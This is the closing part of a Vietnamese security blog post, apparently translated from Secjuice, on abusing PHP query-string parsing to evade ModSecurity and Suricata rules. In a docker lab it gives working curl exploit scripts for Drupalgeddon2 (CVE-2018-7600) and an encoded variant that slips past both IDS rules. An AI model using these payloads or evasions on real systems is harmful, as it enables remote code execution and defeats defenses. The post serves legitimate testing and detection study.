</span></span></code></pre></td></tr></table></div></div></li></ul><h2 id=waf-modsecurity>WAF (ModSecurity)<a hidden class=anchor aria-hidden=true href=#waf-modsecurity>#</a></h2><ul><li>PHP query string paser cũng có thể bị sử dụng để bỏ qua các quy tắc của WAF. Hãy tưởng tượng một quy tắc ModSecurty như <code>SecRule! !ARGS:news_id "@rx ^[0-9]+$" "block"</code> thiên về bypass technique. May mắn thay, trong ModSecurity bạn chỉ có thể chỉ định 1 query string bằng một REGEX. Ví dụ:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SecRule !ARGS:/news.id/ &#34;@rx ^[0-9]+$&#34; &#34;block&#34;
</span></span></code></pre></td></tr></table></div></div>Điều này sẽ chặn các yêu cầu sau:</li></ul><p><img loading=lazy src=https://images.viblo.asia/fac7c66b-2a3e-472d-8cf9-b2c1868ffb0d.png alt></p><h2 id=poc--gtfo>PoC || GTFO<a hidden class=anchor aria-hidden=true href=#poc--gtfo>#</a></h2><ul><li>Bây giờ tôi có thể tạo PoC với Suricata và Drupal CMS với exploit CVE-2018-7600 (Drupalgeddon2 Remote Code Execution). Để đơn giản hơn, tôi sẽ chạy Suricata và Drupal trên 2 con container docker và tôi sẽ cố gắng khai thác Drupal từ container Suricata.</li><li>Tôi sẽ active 2 rules bên Suricata:<ul><li>A custom rule that blocks form_id=user_register_form</li><li>A Positive Technologies Suricata rule for CVE-2018-7600
<img loading=lazy src=https://images.viblo.asia/9e49d51c-d7c9-4e1a-a269-8c700b4eb86c.png alt></li></ul></li><li>Để cài đặt Suricata, tôi đã làm theo hướng dẫn ở trên trang chủ, và đối với Drupal, tôi đã chạy vulhub mà bạn có thể clone ở đây: <a href=https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600>Vulhub Drupal</a></li></ul><p><img loading=lazy src=https://images.viblo.asia/3adbc7f9-4c3c-43b6-a468-3222472a05f3.png alt></p><ul><li>Ok rồi, tất cả đã xong, giờ mình có thể sử dụng exploit CVE-2018-7600. Tôi muốn tạo một số bash script mà thực hiện curl, ví dụ:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>URL</span><span class=o>=</span><span class=s2>&#34;/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>QSTRING</span><span class=o>=</span><span class=s2>&#34;form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>COMMAND</span><span class=o>=</span><span class=s2>&#34;id&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl -v -d <span class=s2>&#34;</span><span class=si>${</span><span class=nv>QSTRING</span><span class=si>}${</span><span class=nv>COMMAND</span><span class=si>}</span><span class=s2>&#34;</span> <span class=s2>&#34;http://172.17.0.1:8080</span><span class=nv>$URL</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div>Như bạn có thể thấy, đoạn script trên thực thi lệnh &ldquo;id&rdquo;. Thử nó xem nào
<img loading=lazy src=https://images.viblo.asia/16ad9702-3d18-478b-aacd-a44b73a0b302.png alt></li><li>Nào, bây giờ thử import 2 rules vào Suricata. Tôi đã viết cái đầu tiên, và nó cố gắng khớp <code>form_id=user_register_form</code> vào bên trong 1 request body. Cố gắng viết 1 cái thứ 2 <code>/user/register</code> trong request URL và nó trông giống như <code>#post_render</code> trong request body.</li><li>My rule:</li></ul><p><img loading=lazy src=https://images.viblo.asia/3b14a8e9-3b8a-4f44-bff8-e1ea566fdeda.png alt></p><ul><li>PT rule:</li></ul><p><img loading=lazy src=https://images.viblo.asia/e7f49ff9-ab01-4601-89f2-ca08c02c4c71.png alt></p><ul><li><p>Sau đó restart Suricata, tôi đã sẵn sang để khai khác xem liệu 2 quy tắc trên có chặn được việc khai thác của tôi không.
<img loading=lazy src=https://images.viblo.asia/e88f7de7-e11b-43df-8dcd-7c40de01f077.gif alt></p></li><li><p>Úi trời, tôi đã có 2 bản ghi Suricata:</p><ul><li>ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -> 172.17.0.1:8080</li><li>Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -> 172.17.0.1:</li></ul></li></ul><h2 id=bypass-all-the-things>Bypass all the things!<a hidden class=anchor aria-hidden=true href=#bypass-all-the-things>#</a></h2><ul><li>Cả 2 quy tắc này dễ dàng để bypass. Tôi đã thấy được làm thế nào để bypass rule của tôi với việc lạm dụng PHP query string parser. Tôi có thể thay thế <code>form_id=user_register_form</code> bằng một vài thứ khác như:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>form%5bid=user_register_form
</span></span></code></pre></td></tr></table></div></div><img loading=lazy src=https://images.viblo.asia/ca283457-b755-455b-9eae-5789893fece5.gif alt></li><li>Như bạn có thể thấy được, chỉ có quy tắc PT là phù hợp. Phân tích PT, chúng ta thấy rằng nó khớp với # và phiên bản được mã hóa %23. Chúng ta chỉ có thể bypass bằng cách sử dụng post%5frender thay vì post_render.
<img loading=lazy src=https://images.viblo.asia/ee7cc544-09e7-410b-a731-4ffcedb1c64e.gif alt></li><li>Cả 2 rules đã được bỏ qua bởi exploit sau:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>URL</span><span class=o>=</span><span class=s2>&#34;/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>QSTRING</span><span class=o>=</span><span class=s2>&#34;form%5bid=user_register_form&amp;_drupal_ajax=1&amp;mail[#post%5frender][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>COMMAND</span><span class=o>=</span><span class=s2>&#34;id&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl -v -d <span class=s2>&#34;</span><span class=si>${</span><span class=nv>QSTRING</span><span class=si>}${</span><span class=nv>COMMAND</span><span class=si>}</span><span class=s2>&#34;</span> <span class=s2>&#34;http://172.17.0.1:8080</span><span class=nv>$URL</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div></li></ul><h2 id=tổng-kết>Tổng kết<a hidden class=anchor aria-hidden=true href=#tổng-kết>#</a></h2><ul><li>Nếu các bạn cảm thấy bài viết hay và có ích, mình xin 1 upvote và 1 share nhé :D</li><li>Nguồn: <a href=https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/>https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.ml/tags/cybersecurity/>CyberSecurity</a></li><li><a href=https://minhtuanact.ml/tags/php/>PHP</a></li><li><a href=https://minhtuanact.ml/tags/bypass/>bypass</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.ml/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution-byezkwxazq0/><span class=title>« Prev Page</span><br><span>VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution</span></a>
<a class=next href=https://minhtuanact.ml/posts/cach-an-du-lieu-bi-mat-trong-tep-hinh-anh-hoac-am-thanh-chi-mat-vai-giay-va-vo-cung-an-toan-lzd5dwxoljy/><span class=title>Next Page »</span><br><span>Cách ấn dữ liệu bí mật trong tệp hình ảnh hoặc âm thanh chỉ mất vài giây và vô cùng an toàn</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF on twitter" href="https://twitter.com/intent/tweet/?text=S%e1%bb%ad%20d%e1%bb%a5ng%20PHP%20query%20string%20parser%20%c4%91%e1%bb%83%20qua%20m%e1%ba%b7t%20IDS%2c%20IPS%20v%c3%a0%20WAF&url=https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f&hashtags=CyberSecurity%2cPHP%2cbypass"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f&title=S%e1%bb%ad%20d%e1%bb%a5ng%20PHP%20query%20string%20parser%20%c4%91%e1%bb%83%20qua%20m%e1%ba%b7t%20IDS%2c%20IPS%20v%c3%a0%20WAF&summary=S%e1%bb%ad%20d%e1%bb%a5ng%20PHP%20query%20string%20parser%20%c4%91%e1%bb%83%20qua%20m%e1%ba%b7t%20IDS%2c%20IPS%20v%c3%a0%20WAF&source=https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f&title=S%e1%bb%ad%20d%e1%bb%a5ng%20PHP%20query%20string%20parser%20%c4%91%e1%bb%83%20qua%20m%e1%ba%b7t%20IDS%2c%20IPS%20v%c3%a0%20WAF"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF on whatsapp" href="https://api.whatsapp.com/send?text=S%e1%bb%ad%20d%e1%bb%a5ng%20PHP%20query%20string%20parser%20%c4%91%e1%bb%83%20qua%20m%e1%ba%b7t%20IDS%2c%20IPS%20v%c3%a0%20WAF%20-%20https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Sử dụng PHP query string parser để qua mặt IDS, IPS và WAF on telegram" href="https://telegram.me/share/url?text=S%e1%bb%ad%20d%e1%bb%a5ng%20PHP%20query%20string%20parser%20%c4%91%e1%bb%83%20qua%20m%e1%ba%b7t%20IDS%2c%20IPS%20v%c3%a0%20WAF&url=https%3a%2f%2fminhtuanact.ml%2fposts%2fsu-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf-3p0lp9yo5ox%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://minhtuanact.ml/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>